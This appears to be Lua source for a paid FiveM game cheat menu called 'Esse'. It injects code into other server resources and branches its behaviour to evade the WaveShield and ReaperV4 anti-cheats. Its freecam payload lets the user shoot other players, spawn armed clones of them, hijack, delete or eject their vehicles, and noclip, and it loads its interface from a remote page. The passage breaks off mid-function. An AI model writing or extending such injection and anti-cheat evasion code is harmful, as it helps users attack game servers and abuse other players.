    ["weapon_molotov"] = { label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov") },
    ["weapon_pipebomb"] = { label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb") },
    ["weapon_proxmine"] = { label = "Proximity Mine", hash = GetHashKey("weapon_proxmine") },
    ["weapon_rpg"] = { label = "RPG", hash = GetHashKey("weapon_rpg") },
    ["weapon_grenadelauncher"] = { label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher") },
    ["weapon_hominglauncher"] = { label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher") },
    ["weapon_minigun"] = { label = "Minigun", hash = GetHashKey("weapon_minigun") },
    ["weapon_railgun"] = { label = "Railgun", hash = GetHashKey("weapon_railgun") },

    -- Throwables / Misc
    ["weapon_ball"] = { label = "Baseball", hash = GetHashKey("weapon_ball") },
    ["weapon_smokegrenade"] = { label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade") },
    ["weapon_flare"] = { label = "Flare", hash = GetHashKey("weapon_flare") },
    ["weapon_petrolcan"] = { label = "Jerry Can", hash = GetHashKey("weapon_petrolcan") },
    ["weapon_bzgas"] = { label = "BZ Gas", hash = GetHashKey("weapon_bzgas") }
}

local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or
"Default"                                                                            -- MachoInjectResource | MachoInjectResourceRaw
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource


---@param text string
function Esse:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    print(("^7[^5Esse^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function Esse:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

function Esse:SyncAccountToDUI()
    if not DUI then return end
    if _G.LoggedUser and _G.LoggedType then
        self:SendMessage({
            action = "updateAuthFooter",
            username = _G.LoggedUser,
            subscription = _G.LoggedType,
            expiry = _G.LoggedExpiry or "LIFETIME"
        })
    end
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function Esse:Notify(type, title, desc, duration)
    self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
end

function Esse:GetMenuPath()
    local path = { "Esse" }

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function Esse:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    local payload = {
        action = "updateElements",
        elements = elements,
        index = HoveredIndex - 1,
        path = self:GetMenuPath()
    }

    if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
    end

    self:SendMessage(payload)
end

function Esse:Initialize()
    if not AuthPassed or DUI then return end

    DUI = MachoCreateDui("https://itsfrncsa.github.io/esseDUI/?t=" .. GetGameTimer())
    if DUI then
        MachoShowDui(DUI)
        -- Maghintay ng konti para mag-load ang UI, saka magpadala ng updateBanner
        Citizen.Wait(3000)
        self:SyncAccountToDUI()
        -- IDAGDAG ITO:
        self:SendMessage({
            action = "updateBanner",
            bannerLink = "", -- reliable URL
            bannerColor = "225,225,225"
        })
    end
end

function Esse:SetMenuPosition(x, y)
    if not DUI then return end
    local css = ""
    if x == "Left" then
        css = css .. ".PWrapper { justify-content: flex-start !important; }"
    elseif x == "Center" then
        css = css .. ".PWrapper { justify-content: center !important; }"
    elseif x == "Right" then
        css = css .. ".PWrapper { justify-content: flex-end !important; }"
    end
    if y == "Top" then
        css = css .. ".PWrapper { align-items: flex-start !important; }"
    elseif y == "Middle" then
        css = css .. ".PWrapper { align-items: center !important; }"
    elseif y == "Bottom" then
        css = css .. ".PWrapper { align-items: flex-end !important; }"
    end
    local injectCode = [[
    var style = document.createElement('style');
    style.innerHTML = `]] .. css .. [[`;
    document.head.appendChild(style);
]]
    MachoSendDuiMessage(DUI, json.encode({ action = "executeJS", code = injectCode }))
end

function Esse:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
end

function Esse:ShowUI()
    IsVisible = true
    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "Esse"
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function Esse:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, onSelect, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onSelect = onSelect,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    MachoSendDuiMessage(DUI, json.encode({
        action = "updateKeyboard",
        visible = true,
        title = Title,
        value = CurrentKeyboardInput.buffer
    }))

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, false) ]])
    else
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    end

    Wait(250)
    Esse:HideUI(true)
    MenuOpenable = false
end

MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end

    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onSelect then
            CurrentKeyboardInput.onSelect(CurrentKeyboardInput.buffer)
        end

        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
        SetNuiFocus(false, false)
        sendMenuMessage('setDebugMode')
    ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, false) ]])
        else
            MachoInjectResourceRaw("monitor", [[
        SetNuiFocus(false, false)
        sendMenuMessage('setDebugMode')
    ]])
        end

        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, false) ]])
        else
            MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
        end

        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName then
                if CurrentKeyboardInput.buffer ~= keyName then
                    CurrentKeyboardInput.buffer = keyName
                end
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0",
                [0x31] = "1",
                [0x32] = "2",
                [0x33] = "3",
                [0x34] = "4",
                [0x35] = "5",
                [0x36] = "6",
                [0x37] = "7",
                [0x38] = "8",
                [0x39] = "9",
                [0x41] = "A",
                [0x42] = "B",
                [0x43] = "C",
                [0x44] = "D",
                [0x45] = "E",
                [0x46] = "F",
                [0x47] = "G",
                [0x48] = "H",
                [0x49] = "I",
                [0x4A] = "J",
                [0x4B] = "K",
                [0x4C] = "L",
                [0x4D] = "M",
                [0x4E] = "N",
                [0x4F] = "O",
                [0x50] = "P",
                [0x51] = "Q",
                [0x52] = "R",
                [0x53] = "S",
                [0x54] = "T",
                [0x55] = "U",
                [0x56] = "V",
                [0x57] = "W",
                [0x58] = "X",
                [0x59] = "Y",
                [0x5A] = "Z",
                [0xBD] = "-",
                [0xBB] = "=",
                [0xBC] = ",",
                [0xBE] = ".",
                [0xBA] = ";",
                [0xDE] = "'",
                [0xBF] = "/",
                [0xC0] = "`",
                [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if Esse:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
            if GetResourceState("WaveShield") == "started" then
                MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(true, true)
            sendMenuMessage('setDebugMode')
        ]])
            elseif GetResourceState("ReaperV4") == "started" then
                -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, false) ]])
            else
                MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(true, true)
            sendMenuMessage('setDebugMode')
        ]])
            end
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

--- Scrolling function for normal navigation
---@param direction "Up"|"Down"
function Esse:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

--- Scrolling function for scrollable/slider tab navigation
---@param direction "Left"|"Right"
function Esse:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then
        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function Esse:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack,
            { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.type == "Server" then
            Esse:UpdateListMenu()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
        if not ok then self:Debug("red", "onSelect error: " .. tostring(err)) end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "Esse", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                current.onSelect(current.values[current.value])
            end
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
        end
        return
    end
end

local firstFallbackBlocked = false

function Esse:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function Esse:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function Esse:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

---@param state boolean
---@param speed number


function Esse:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then return end

    if state then
        _G.FreecamLuaActive = true
        self:Notify("success", "Esse",
            "Freecam ENABLED - Arrow keys / mouse wheel to navigate, Left click to act", 4000)

        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"

        MachoInjectResource(targetRes, [===[
        _G.freecamMaster = true
        _G.freecamEnabled = true          -- <-- DAPAT TRUE agad
        _G.selectedIndex = 1
        _G.sultanSpeed = 100

        local pistolHash = GetHashKey("WEAPON_PISTOL")
        local carbineHash = GetHashKey("WEAPON_CARBINERIFLE")

        local menuOptions = {"Shoot (Semi)", "Shoot (Auto)", "Evil Twin (Risky)", "Attach Prop", "Tp Me", "Sultan Throw", "Delete Entity", "Hijack Vehicle", "Kick from Vehicle"}

        local function DrawMenuItem(label, x, y, selected)
            SetTextFont(0)
            SetTextScale(0.28, 0.28)
            SetTextOutline()
            if selected then SetTextColour(255, 0, 0, 255) else SetTextColour(255, 255, 255, 255) end
            SetTextCentre(true)
            BeginTextCommandDisplayText("STRING")
            AddTextComponentSubstringPlayerName(label)
            EndTextCommandDisplayText(x, y)
        end

        local function RotationToDirection(rot)
            local z, x = math.rad(rot.z), math.rad(rot.x)
            return vector3(-math.sin(z) * math.abs(math.cos(x)), math.cos(z) * math.abs(math.cos(x)), math.sin(x))
        end

        _G.StartFreecam = function(active)
            local ped = PlayerPedId()
            FreezeEntityPosition(ped, active)
            SetEntityInvincible(ped, active)

            if active then
                _G._fc_pos = GetGameplayCamCoord()
                local rot = GetGameplayCamRot(2)
                _G._fc_rot = vector3(rot.x, 0.0, rot.z)
                _G._fc_cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                SetCamActive(_G._fc_cam, true)
                RenderScriptCams(true, true, 500, true, true)

                -- Thread for menu drawing and camera movement
                Citizen.CreateThread(function()
                    while _G.freecamEnabled do
                        Wait(0)
                        local menuX, startY = 0.5, 0.72
                        for i, name in ipairs(menuOptions) do
                            local displayName = name
                            if name == "Sultan Throw" and i == _G.selectedIndex then
                                displayName = name .. " | " .. _G.sultanSpeed .. " MPH"
                            end
                            DrawMenuItem(displayName, menuX, startY + (i * 0.025), (i == _G.selectedIndex))
                        end

                        DrawRect(0.5, 0.5, 0.002, 0.004, 255, 0, 0, 255)

                        local lookX, lookY = GetDisabledControlNormal(0, 1), GetDisabledControlNormal(0, 2)
                        _G._fc_rot = vector3(math.max(math.min(_G._fc_rot.x + (-lookY * 8), 80.0), -80.0), 0.0, _G._fc_rot.z + (-lookX * 8))
                        local speed = IsDisabledControlPressed(0, 21) and 2.5 or (IsDisabledControlPressed(0, 19) and 0.05 or 0.5)
                        local rx, rz = math.rad(_G._fc_rot.x), math.rad(_G._fc_rot.z)
                        local dir = vector3(-math.sin(rz) * math.cos(rx), math.cos(rz) * math.cos(rx), math.sin(rx))
                        local sDir = vector3(-math.cos(rz), -math.sin(rz), 0.0)

                        if IsDisabledControlPressed(0, 32) then _G._fc_pos = _G._fc_pos + (dir * speed) end
                        if IsDisabledControlPressed(0, 33) then _G._fc_pos = _G._fc_pos - (dir * speed) end
                        if IsDisabledControlPressed(0, 34) then _G._fc_pos = _G._fc_pos + (sDir * speed) end
                        if IsDisabledControlPressed(0, 35) then _G._fc_pos = _G._fc_pos - (sDir * speed) end

                        SetCamCoord(_G._fc_cam, _G._fc_pos.x, _G._fc_pos.y, _G._fc_pos.z)
                        SetCamRot(_G._fc_cam, _G._fc_rot.x, _G._fc_rot.y, _G._fc_rot.z, 2)
                        SetAudioFlag("UseScriptedCameraFilter", true)
                        DisableControlAction(0, 30, true) DisableControlAction(0, 31, true)
                        DisableControlAction(0, 32, true) DisableControlAction(0, 33, true)
                        DisableControlAction(0, 34, true) DisableControlAction(0, 35, true)
                        DisableControlAction(0, 1, true) DisableControlAction(0, 2, true)
                        DisableControlAction(0, 24, true)
                        DisableControlAction(0, 14, true) DisableControlAction(0, 15, true)
                    end
                end)

                -- Thread for actions
                Citizen.CreateThread(function()
            while _G.freecamEnabled do
                Wait(0)
                local currentPed = PlayerPedId()
                local mode = menuOptions[_G.selectedIndex]

                -- Navigation (UP/DOWN) - mouse wheel o arrow keys
                if IsDisabledControlJustPressed(0, 15) or IsDisabledControlJustPressed(0, 173) then
                    _G.selectedIndex = (_G.selectedIndex - 2) % #menuOptions + 1
                elseif IsDisabledControlJustPressed(0, 14) or IsDisabledControlJustPressed(0, 172) then
                    _G.selectedIndex = _G.selectedIndex % #menuOptions + 1
                end

                -- Adjust Sultan Throw speed (LEFT/RIGHT arrows)
                if mode == "Sultan Throw" then
                    if IsDisabledControlJustPressed(0, 44) then
                        _G.sultanSpeed = math.max(100, _G.sultanSpeed - 100)
                    elseif IsDisabledControlJustPressed(0, 38) then
                        _G.sultanSpeed = math.min(500, _G.sultanSpeed + 100)
                    end
                end

                -- Raycast para malaman ang tinututok
                local camRot = GetCamRot(_G._fc_cam, 2)
                local camPos = GetCamCoord(_G._fc_cam)
                local direction = RotationToDirection(camRot)
                local ray = StartExpensiveSynchronousShapeTestLosProbe(camPos.x, camPos.y, camPos.z, camPos.x + (direction.x * 500), camPos.y + (direction.y * 500), camPos.z + (direction.z * 500), -1, currentPed, 4)
                local _, hit, coords, _, targetEntity = GetShapeTestResult(ray)

                local isPressing = IsDisabledControlPressed(0, 24)
                local isJustPressed = IsDisabledControlJustPressed(0, 24)

                if (mode == "Shoot (Auto)" and isPressing) or (mode ~= "Shoot (Auto)" and isJustPressed) then
                    if mode == "Shoot (Semi)" then
                        ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, pistolHash, currentPed, true, true, 1000.0)
                    elseif mode == "Shoot (Auto)" then
                        ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, coords.x, coords.y, coords.z, 1000, true, carbineHash, currentPed, true, true, 1000.0)
                        Wait(100)
                    elseif mode == "Evil Twin (Risky)" and hit then
                        if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                            local model = GetEntityModel(targetEntity)
                            RequestModel(model)
                            while not HasModelLoaded(model) do Wait(0) end
                            local twin = ClonePed(targetEntity, GetEntityHeading(targetEntity), true, true)
                            if DoesEntityExist(twin) then
                                SetEntityCoords(twin, coords.x + 1.2, coords.y + 1.2, coords.z, false, false, false, true)
                                SetEntityAsMissionEntity(twin, true, true)
                                local weapon = GetHashKey("WEAPON_KNIFE")
                                GiveWeaponToPed(twin, weapon, 1, false, true)
                                SetCurrentPedWeapon(twin, weapon, true)
                                SetPedCombatAttributes(twin, 46, true)
                                SetPedCombatAbility(twin, 100)
                                SetPedFleeAttributes(twin, 0, false)
                                SetBlockingOfNonTemporaryEvents(twin, true)
                                TaskCombatPed(twin, targetEntity, 0, 16)
                                SetEntityAsNoLongerNeeded(twin)
                            end
                        end
                    elseif mode == "Hijack Vehicle" and hit then
                        if DoesEntityExist(targetEntity) and IsEntityAVehicle(targetEntity) then
                            NetworkRequestControlOfEntity(targetEntity)
                            SetPedIntoVehicle(currentPed, targetEntity, -1)
                            SetVehicleEngineOn(targetEntity, true, true, false)
                            _G.freecamEnabled = false
                            _G.StartFreecam(false)
                        end
                    elseif mode == "Attach Prop" and hit then
                        if DoesEntityExist(targetEntity) and IsEntityAPed(targetEntity) then
                            local propHash = GetHashKey("prop_logpile_06b")
                            RequestModel(propHash)
                            while not HasModelLoaded(propHash) do Wait(0) end
                            local obj = CreateObject(propHash, coords.x, coords.y, coords.z, true, true, true)
                            AttachEntityToEntity(obj, targetEntity, GetPedBoneIndex(targetEntity, 24818), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                            SetEntityAsNoLongerNeeded(obj)
                        end
                    elseif mode == "Tp Me" then
                        SetEntityCoords(currentPed, coords.x, coords.y, coords.z, false, false, false, false)
                    elseif mode == "Sultan Throw" then
                        local sHash = GetHashKey("sultan")
                        RequestModel(sHash)
                        while not HasModelLoaded(sHash) do Wait(0) end
                        local veh = CreateVehicle(sHash, camPos.x, camPos.y, camPos.z, camRot.z, true, false)
                        SetEntityVelocity(veh, direction.x * _G.sultanSpeed, direction.y * _G.sultanSpeed, direction.z * _G.sultanSpeed)
                        Citizen.SetTimeout(5000, function() if DoesEntityExist(veh) then DeleteEntity(veh) end end)
                    elseif mode == "Delete Entity" and hit then
                        if DoesEntityExist(targetEntity) then
                            NetworkRequestControlOfEntity(targetEntity)
                            SetEntityAsMissionEntity(targetEntity, true, true)
                            DeleteEntity(targetEntity)
                        end
                    elseif mode == "Kick from Vehicle" and hit and IsEntityAVehicle(targetEntity) then
                        local driver = GetPedInVehicleSeat(targetEntity, -1)
                        if driver and DoesEntityExist(driver) then
                            NetworkRequestControlOfEntity(targetEntity)
                            ClearPedTasksImmediately(driver)
                            TaskLeaveVehicle(driver, targetEntity, 0)
                            -- Opsyonal: paalisin lahat ng pasahero
                            for seat = 0, 5 do
                                local passenger = GetPedInVehicleSeat(targetEntity, seat)
                                if passenger and passenger ~= driver and DoesEntityExist(passenger) then
                                    TaskLeaveVehicle(passenger, targetEntity, 0)
                                end
                            end
                        end
                    end
                end
            end
                    -- cleanup
                    RenderScriptCams(false, true, 500, true, true)
                    if DoesCamExist(_G._fc_cam) then DestroyCam(_G._fc_cam) end
                    FreezeEntityPosition(PlayerPedId(), false)
                    SetEntityInvincible(PlayerPedId(), false)
                end)
            end
        end

        -- ✅ Simulan agad ang freecam
        _G.StartFreecam(true)
    ]===])
    else
        _G.FreecamLuaActive = false
        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"
        MachoInjectResource(targetRes, [[
        if _G.freecamEnabled then
            _G.freecamEnabled = false
            if _G.StartFreecam then _G.StartFreecam(false) end
        end
        _G.freecamEnabled = false
    ]])
        self:Notify("error", "Esse", "Freecam DISABLED", 3000)
    end
end

function Esse:RunNormalNoclip(enable)
    if enable then
        self:Notify("success", "Esse", "Normal Noclip Enabled", 3000)

        -- Gamitin ang kasalukuyang speed mula sa global variable
        local currentSpeed = _G.NormalNoclipSpeed or 0.5

        local code = string.format([[
        _G.NormalNoclipActive = true
        -- Huwag i-hardcode, gamitin ang existing global
        _G.NormalNoclipSpeed = _G.NormalNoclipSpeed or %f

        if not _G.NormalNoclipThreadRunning then
            _G.NormalNoclipThreadRunning = true

            Citizen.CreateThread(function()
                while _G.NormalNoclipThreadRunning do
                    Citizen.Wait(0)
                    if not _G.NormalNoclipActive then
                        Citizen.Wait(500)
                        goto continue
                    end

                    local ped = PlayerPedId()
                    if not DoesEntityExist(ped) then goto continue end

                    local vehicle = GetVehiclePedIsIn(ped, false)
                    local entity = (vehicle ~= 0 and vehicle) or ped
                    if not DoesEntityExist(entity) then goto continue end

                    local coords = GetEntityCoords(entity, true)
                    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                    local pitch = GetGameplayCamRelativePitch()

                    local dx = -math.sin(heading * math.pi / 180.0)
                    local dy = math.cos(heading * math.pi / 180.0)
                    local dz = math.sin(pitch * math.pi / 180.0)
                    local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                    if len ~= 0 then
                        dx, dy, dz = dx / len, dy / len, dz / len
                    end

                    -- basahin ang speed sa bawat frame para dynamic
                    local speed = _G.NormalNoclipSpeed or %f
                    if IsControlPressed(0, 21) then speed = speed + 1 end
                    if IsControlPressed(0, 19) then speed = 0.10 end

                    if IsControlPressed(0, 32) then
                        coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                    end
                    if IsControlPressed(0, 33) then
                        coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                    end
                    if IsControlPressed(0, 34) then
                        coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                    end
                    if IsControlPressed(0, 35) then
                        coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                    end
                    if IsControlPressed(0, 22) then
                        coords = coords + vector3(0.0, 0.0, speed)
                    end
                    if IsControlPressed(0, 36) then
                        coords = coords - vector3(0.0, 0.0, speed)
                    end

                    SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                    SetEntityHeading(entity, heading)

                    ::continue::
                end
            end)
        end
    ]], currentSpeed, currentSpeed)

        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"
        Injection(targetRes, code)
    else
        self:Notify("error", "Esse", "Normal Noclip Disabled", 3000)
        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"
        Injection(targetRes, "_G.NormalNoclipActive = false")
    end
end

function Esse:EnableInfiniteAmmo()
    if GetResourceState("WaveShield") == "started" then
        print('1')
        local function decode(tbl)
            local s = ""
